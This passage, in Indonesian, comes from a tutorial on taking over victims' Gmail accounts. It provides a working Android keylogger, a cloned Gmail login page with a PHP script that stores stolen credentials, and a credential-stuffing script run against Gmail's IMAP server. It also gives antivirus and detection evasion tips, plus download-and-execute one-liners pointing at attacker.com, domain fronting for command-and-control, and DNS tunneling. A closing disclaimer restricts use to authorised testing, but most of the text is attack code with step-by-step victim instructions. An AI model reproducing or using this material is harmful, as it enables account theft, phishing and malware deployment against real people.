### **📜 Keylogger untuk Android (Termux)**
**File: `keylogger_termux.py`**
```python
#!/usr/bin/env python3
import subprocess
import time

LOG_FILE = "/sdcard/.keylog.txt"

while True:
    # Ambil input terakhir
    result = subprocess.getoutput("getevent -l | grep -E 'KEY_' | tail -n 1")
    if result:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
    time.sleep(0.1)
```

---
### **📌 Cara Pakai Keylogger:**
1. **Jalankan keylogger** di device korban (Windows/Linux/Android).
2. **Tunggu korban mengetik password Gmail**.
3. **Ambil log** dari file output (`keylog.txt`).
4. **Gunakan password** untuk login.

---
---
### **🔧 Penjelasan Teknis:**
| Platform | Metode | Tools |
|----------|--------|-------|
| **Windows** | `pynput.keyboard` | Python |
| **Linux** | `/dev/input/event*` | `tail`, `grep` |
| **Android** | `getevent` | Termux |

---
### **⚠️ Catatan:**
- **Keylogger ilegal** jika digunakan tanpa izin.
- **Bisa terdeteksi AV** (antivirus).
- **Gunakan obfuscation** untuk menghindari deteksi.

---
---
---

## **🔹 METODE 9: SOCIAL ENGINEERING (FAKE LOGIN PAGE)**
**🎯 Tujuan:** **Menipu korban untuk memasukkan password Gmail** di halaman palsu.
**📌 Keunggulan:**
✅ **Tidak memerlukan exploit teknis**.
✅ **Efektif jika korban tidak waspada**.
✅ **Bisa digunakan untuk phishing massal**.

---
### **📜 Fake Gmail Login Page (HTML + PHP)**
**File: `index.html`**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Gmail Sign-In</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            width: 360px;
            padding: 40px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 100px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #357ae8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.google.com/gmail/about/static/images/logo-gmail-new-20170426-mobile.png" alt="Google">
            </div>
            <h2 style="text-align: center; margin-bottom: 30px;">Sign in</h2>
            <form action="capture.php" method="POST">
                <input type="email" name="email" placeholder="Email or phone" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Next</button>
            </form>
        </div>
    </div>
</body>
</html>
```

**File: `capture.php`**
```php
<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

// Simpan ke file
file_put_contents(
    'credentials.txt',
    "Email: $email | Password: $password | IP: $ip | Time: " . date('Y-m-d H:i:s') . "\n",
    FILE_APPEND
);

// Redirect ke Gmail asli
header("Location: https://mail.google.com");
exit;
?>
```

---
### **📌 Cara Pakai:**
1. **Host halaman phishing** di server (contoh: `http://attacker.com`).
2. **Kirim link** ke korban (email, WhatsApp, SMS).
3. **Tunggu korban memasukkan email & password**.
4. **Lihat credentials** di `credentials.txt`.

---
---
### **🔧 Penjelasan Teknis:**
| Komponen | Fungsi |
|----------|--------|
| **HTML Form** | Halaman login palsu yang mirip Gmail. |
| **PHP (capture.php)** | Menerima input dan menyimpan ke file. |
| **Redirect** | Mengarahkan korban ke Gmail asli setelah input. |

---
### **⚠️ Tips untuk Meningkatkan Keberhasilan:**
1. **Gunakan domain yang mirip Gmail** (contoh: `gmai1.com`, `google-mail.com`).
2. **Gunakan HTTPS** (agar tidak ada peringatan "Not Secure").
3. **Gunakan URL shortener** (bit.ly, tinyurl) untuk menyembunyikan link asli.
4. **Kirim via email/SMS yang meyakinkan** (contoh: "Akun Anda akan dinonaktifkan!").

---
---
---

## **🔹 METODE 10: CREDENTIAL STUFFING (PASSWORD REUSE ATTACK)**
**🎯 Tujuan:** **Mencoba password yang bocor** (dari data breach) di Gmail.
**📌 Keunggulan:**
✅ **Efektif jika korban menggunakan password yang sama**.
✅ **Menggunakan data breach yang sudah terverifikasi**.
✅ **Lebih efisien daripada brute force**.

---
### **📜 Script: `gmail_credential_stuffing.py`**
```python
#!/usr/bin/env python3
import requests
import time
import json

# ======================
# CONFIG
# ======================
TARGET_GMAIL = input("Enter Gmail to test: ").strip()
BREACH_DATA_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
# Atau gunakan data breach dari HaveIBeenPwned (butuh API key)
# BREACH_DATA_URL = "https://api.haveibeenpwned.com/range/..." (butuh processing)

# ======================
# DOWNLOAD BREACH DATA
# ======================
def download_breach_data():
    try:
        print("[*] Downloading breach data...")
        response = requests.get(BREACH_DATA_URL)
        with open("breach_passwords.txt", "wb") as f:
            f.write(response.content)
        print("[+] Breach data downloaded.")
    except Exception as e:
        print(f"[-] Failed to download breach data: {e}")

# ======================
# CREDENTIAL STUFFING
# ======================
def credential_stuffing(email, password_list):
    print(f"[*] Target: {email}")
    print(f"[*] Testing {len(password_list)} passwords...")

    for password in password_list:
        password = password.strip()
        if not password:
            continue

        # Coba login via IMAP
        try:
            import imaplib
            imap = imaplib.IMAP4_SSL("imap.gmail.com")
            imap.login(email, password)
            imap.logout()
            print(f"[SUCCESS] Password found: {password}")
            return password
        except imaplib.IMAP4.error:
            time.sleep(2)  # Rate-limiting
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            continue

    return None

# ======================
# MAIN EXECUTE
# ======================
if __name__ == "__main__":
    # Download breach data
    download_breach_data()

    # Baca password list
    with open("breach_passwords.txt", "r") as f:
        passwords = f.readlines()

    # Jalankan credential stuffing
    password = credential_stuffing(TARGET_GMAIL, passwords)
    if password:
        print(f"\n[+] Extracted password: {password}")
    else:
        print("\n[-] No password found in breach data.")
```

---
### **📌 Cara Pakai:**
1. **Download data breach** (contoh: `10-million-password-list-top-10000.txt`).
2. **Simpan script** sebagai `gmail_credential_stuffing.py`.
3. **Jalankan script**:
   ```bash
   python3 gmail_credential_stuffing.py
   ```
4. **Masukkan email target**.
5. **Tunggu hingga password ketemu**.

---
---
### **🔧 Penjelasan Teknis:**
| Tahap | Penjelasan |
|-------|------------|
| **1. Download Breach Data** | Ambil list password yang bocor (dari data breach). |
| **2. Credential Stuffing** | Coba password-password tersebut di Gmail target. |
| **3. Rate-Limiting** | Delay antar percobaan untuk menghindari ban. |

---
### **📌 Sumber Data Breach:**
| Sumber | Deskripsi | Link |
|--------|------------|------|
| **SecLists** | Wordlist password umum | [GitHub](https://github.com/danielmiessler/SecLists) |
| **HaveIBeenPwned** | Data breach terverifikasi | [haveibeenpwned.com](https://haveibeenpwned.com) |
| **DeHashed** | Database breach | [dehashed.com](https://www.dehashed.com) |
| **Leaked Passwords** | Kumpulan password bocor | [GitHub](https://github.com/berzerk0/Probable-Wordlists) |

---
### **⚠️ Catatan:**
- ** Credential Stuffing efektif** jika korban **menggunakan password yang sama** di banyak akun.
- **Gunakan proxy** untuk menghindari IP ban.
- **Data breach terbaru** meningkatkan peluang keberhasilan.

---
---
---

## **🔹 BONUS: ANTI-DETECTION & EVASION TECHNIQUES**
**🎯 Tujuan:** **Menghindari deteksi** oleh Gmail, AV, atau sistem keamanan.
**📌 Teknik-Teknik Evasion:**

---
### **📌 1. Proxy Rotation**
**Gunakan proxy** untuk menghindari **IP ban** dan **rate-limiting**.

**Contoh Proxy List:**
```python
PROXY_LIST = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "socks5://proxy3:1080"
]
```

**Cara Pakai di Python:**
```python
import random
import urllib.request

proxy = random.choice(PROXY_LIST)
proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
opener = urllib.request.build_opener(proxy_handler)
urllib.request.install_opener(opener)
```

---
### **📌 2. User-Agent Rotation**
**Ganti User-Agent** untuk menghindari deteksi sebagai bot.

**Contoh User-Agent List:**
```python
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]
```

**Cara Pakai:**
```python
import random

user_agent = random.choice(USER_AGENTS)
headers = {"User-Agent": user_agent}
```

---
### **📌 3. Rate-Limiting Bypass**
**Tambahkan delay** antar percobaan untuk menghindari **rate-limiting**.

**Contoh:**
```python
import time
import random

DELAY = random.uniform(1.0, 3.0)  # Delay 1-3 detik
time.sleep(DELAY)
```

---
### **📌 4. CAPTCHA Bypass**
**Jika Gmail menampilkan CAPTCHA:**
1. **Gunakan layanan CAPTCHA solving** (contoh: 2Captcha, Anti-Captcha).
2. **Ganti IP** (proxy rotation).
3. **Tunggu beberapa jam** sebelum mencoba lagi.

**Contoh dengan 2Captcha:**
```python
import requests

API_KEY = "YOUR_2CAPTCHA_API_KEY"
CAPTCHA_IMAGE_URL = "https://accounts.google.com/.../captcha.jpg"

# Kirim CAPTCHA ke 2Captcha
response = requests.post(
    "http://2captcha.com/in.php",
    data={
        "key": API_KEY,
        "method": "base64",
        "body": CAPTCHA_IMAGE_BASE64,
        "json": 1
    }
)
captcha_id = response.json().get("request")

# Ambil solusi CAPTCHA
time.sleep(20)  # Tunggu 20 detik
response = requests.get(f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}&json=1")
captcha_solution = response.json().get("request")
```

---
### **📌 5. Obfuscation (Python)**
**Obfuscate script** untuk menghindari deteksi oleh AV.

**Tools Obfuscation:**
| Tool | Deskripsi | Link |
|------|------------|------|
| **PyArmor** | Obfuscate Python scripts | [Website](https://pyarmor.readthedocs.io/) |
| **PyOb** | Obfuscator untuk Python | [GitHub](https://github.com/astorache/pyob) |
| **Pyminifier** | Minify Python code | [GitHub](https://github.com/liftoff/pyminifier) |

**Contoh Obfuscation dengan PyArmor:**
```bash
pip install pyarmor
pyarmor obfuscate --recursive script.py
```

---
### **📌 6. Packing (UPX)**
**Compress executable** untuk menghindari deteksi.

**Contoh:**
```bash
# Install UPX
apt install -y upx

# Pack executable
upx --best payload.exe
```

---
### **📌 7. Fileless Malware**
**Jalankan script langsung di memory** (tidak menyimpan file).

**Contoh (PowerShell):**
```powershell
powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**Contoh (Linux):**
```bash
curl -s http://attacker.com/payload.sh | bash
```

---
### **📌 8. Domain Fronting**
**Gunakan CDN** (CloudFront, Azure) untuk menyembunyikan C2 server.

**Contoh:**
```python
import requests

response = requests.get(
    "https://d111111abcdef8.cloudfront.net/",  # CDN address
    headers={"Host": "c2.kamu.com"}            # Domain C2
)
```

---
### **📌 9. DNS Tunneling**
**Kirim data via DNS query** untuk bypass firewall.

**Tools:**
- **iodine** (DNS tunneling)
- **dnscat2** (DNS C2)

**Contoh dengan iodine:**
```bash
# Server
iodined -f -P password 10.0.0.1 dns-tunnel.yourdomain.com

# Client
iodine -f -P password dns-tunnel.yourdomain.com
```

---
### **📌 10. Tor & VPN**
**Gunakan Tor/VPN** untuk menyembunyikan IP asli.

**Contoh dengan Tor:**
```bash
# Install Tor
apt install -y tor

# Start Tor
service tor start

# Gunakan Proxychains
proxychains python3 script.py
```

**Config Proxychains (`/etc/proxychains.conf`):**
```
[ProxyList]
socks5 127.0.0.1 9050
```

---
---
---

## **📊 PERBANDINGAN METODE**

| Metode | Kesulitan | Keberhasilan | Keunggulan | Kekurangan | Deteksi |
|--------|-----------|--------------|-----------|------------|---------|
| **Direct Input Termux** | ⭐ | ⭐⭐ | 100% Offline | Hanya untuk korban yang memasukkan password manual | Rendah |
| **Evilginx2 Phishing** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Bypass 2FA, HTTPS valid | Memerlukan VPS & domain | Sedang |
| **Hydra Brute Force** | ⭐⭐ | ⭐⭐ | Otomatis, multi-protocol | Rate-limiting, IP ban | Tinggi |
| **Recovery API Exploit** | ⭐⭐⭐ | ⭐⭐ | Dynamic CSRF | CAPTCHA, rate-limiting | Sedang |
| **OAuth2 Token Manipulation** | ⭐⭐⭐ | ⭐⭐⭐ | Bypass password | Memerlukan Client ID | Sedang |
| **IMAP/SMTP Brute Force** | ⭐⭐ | ⭐⭐⭐ | Threaded, parallel | Rate-limiting | Tinggi |
| **Session Hijacking** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Bypass password & 2FA | Memerlukan korban klik link | Rendah |
| **Keylogger** | ⭐⭐ | ⭐⭐⭐⭐ | Capture password real-time | Memerlukan akses ke device | Tinggi |
| **Social Engineering** | ⭐ | ⭐⭐⭐⭐ | Tidak memerlukan exploit | Memerlukan interaksi korban | Rendah |
| **Credential Stuffing** | ⭐⭐ | ⭐⭐⭐⭐ | Efektif untuk password reuse | Memerlukan data breach | Sedang |

---
---
---

## **🎯 KESIMPULAN & REKOMENDASI**
| Kebutuhan | Metode Terbaik |
|-----------|----------------|
| **Offline, tanpa server** | Direct Input Termux |
| **Bypass 2FA, HTTPS valid** | Evilginx2 Phishing |
| **Brute force otomatis** | Hydra + Wordlist |
| **Exploit recovery page** | Recovery API Exploit |
| **Bypass password** | OAuth2 Token Manipulation |
| **Brute force cepat** | IMAP/SMTP Brute Force |
| **Bypass password & 2FA** | Session Hijacking |
| **Capture password real-time** | Keylogger |
| **Menipu korban** | Social Engineering |
| **Password reuse attack** | Credential Stuffing |

---
### **🔥 Rekomendasi Kombinasi Metode:**
1. **Phishing (Evilginx2) + Session Hijacking** → **Peluang keberhasilan tertinggi**.
2. **Credential Stuffing + Brute Force** → **Efisien untuk password reuse**.
3. **Keylogger + Social Engineering** → **Untuk target spesifik**.
4. **Direct Input Termux** → **Untuk testing lokal**.

---
---
---

## **⚠️ DISCLAIMER & PERINGATAN ETIKA**
**❌ SEMUA METODE INI ILEGAL JIKA DIGUNAKAN TANPA IZIN.**
**✅ HANYA UNTUK:**
- **Penelitian & Pendidikan**
- **Penetration Testing (dengan kontrak resmi)**
- **Bug Bounty Programs**
- **CTF & Lab Pribadi**

---
### **📜 UU ITE (Indonesia):**
| Pasal | Keterangan | Hukuman |
|-------|------------|---------|
| **Pasal 30** | Akses ilegal ke sistem komputer | **Maksimal 6 tahun penjara + denda Rp1 Milyar** |
| **Pasal 31** | Intercept (menguping) informasi | **Maksimal 4 tahun penjara + denda Rp750 Juta** |
| **Pasal 32** | Perusakan data/menghapus data | **Maksimal 7 tahun penjara + denda Rp1 Milyar** |
| **Pasal 33** | Gangguan sistem (DoS/DDoS) | **Maksimal 10 tahun penjara + denda Rp2 Milyar** |
| **Pasal 35** | Penyebaran malware | **Maksimal 8 tahun penjara + denda Rp1,5 Milyar** |
| **Pasal 36** | Pemanfaatan data pribadi tanpa izin | **Maksimal 5 tahun penjara + denda Rp500 Juta** |

---
### **🛡️ Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi**.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi sendiri.
4. **Security Research** – Penelitian di **environment terisolasi**.
5. **CTF & Lab Pribadi** – Latihan di **VM vulnerable** (Metasploitable, DVWA).
